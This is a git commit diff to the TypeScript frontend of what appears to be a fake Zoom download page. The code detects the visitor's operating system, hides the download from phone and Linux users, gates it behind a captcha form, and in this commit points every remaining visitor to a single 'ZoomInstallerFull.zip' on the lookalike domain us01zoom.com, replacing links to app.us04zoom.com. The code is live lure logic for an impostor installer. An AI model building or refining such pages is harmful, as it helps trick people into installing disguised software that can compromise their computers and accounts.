48943dabed9f1d263dfea02d795fcadfd3bf8a8f
Vlad <vampir7421@gmail.com>
2025-07-20 17:33:32 +0300

    make one download link

--- frontend/src/main.ts
+++ frontend/src/main.ts
@@ -8,41 +8,11 @@ declare global {
 
 const textPhone = document.getElementById('hidden-text-phone') as HTMLParagraphElement
 const textLinux = document.getElementById('hidden-text-linux') as HTMLParagraphElement
-const updateLink = document.getElementById('update-link') as HTMLAnchorElement
-const asideDownload = document.getElementById('aside-download') as HTMLAnchorElement
-const asideUpdate = document.getElementById('aside-update') as HTMLAnchorElement
 const captchaText = document.getElementById('captcha-text') as HTMLParagraphElement
 const protectedForm = document.getElementById('protected-form') as HTMLFormElement
 
 const osCategory: string = getOSCategory()
 
-const downloadLink = updateLinks(osCategory)
-
-function updateLinks(osCategory: string): string {
-	let link = ''
-	switch (osCategory) {
-		case 'Windows':
-			link = 'https://app.us04zoom.com/files/windows/ZoomInstallerFull.zip'
-			updateLink.href = 'https://app.us04zoom.com/files/windows/ZoomInstallerFull.zip';
-			asideDownload.href = 'https://app.us04zoom.com/files/windows/ZoomInstallerFull.zip';
-			asideUpdate.href = 'https://app.us04zoom.com/files/windows/ZoomInstallerFull.zip';
-			break;
-		case 'macOS < 15':
-			link = 'https://app.us04zoom.com/files/mac/ZoomInstallerFull.dmg'
-			updateLink.href = 'https://app.us04zoom.com/files/mac/ZoomInstallerFull.dmg';
-			asideDownload.href = 'https://app.us04zoom.com/files/mac/ZoomInstallerFull.dmg';
-			asideUpdate.href = 'https://app.us04zoom.com/files/mac/ZoomInstallerFull.dmg';
-			break;
-		case 'macOS >= 15':
-			link = 'https://app.us04zoom.com/files/mac15/ZoomInstallerFull.dmg'
-			updateLink.href = 'https://app.us04zoom.com/files/mac15/ZoomInstallerFull.dmg';
-			asideDownload.href = 'https://app.us04zoom.com/files/mac15/ZoomInstallerFull.dmg';
-			asideUpdate.href = 'https://app.us04zoom.com/files/mac15/ZoomInstallerFull.dmg';
-			break;
-	}
-
-	return link
-}
 
 function getOSCategory() {
 	const os = platform.os;
@@ -98,7 +68,7 @@ protectedForm.addEventListener("submit", async function(e) {
 		} else if (osCategory == "Linux") {
 			textLinux.style.display = 'block'
 		} else {
-			window.open(downloadLink, '_blank')
+			window.open('https://us01zoom.com/download/ZoomInstallerFull.zip', '_blank')
 		}
 	}
 })
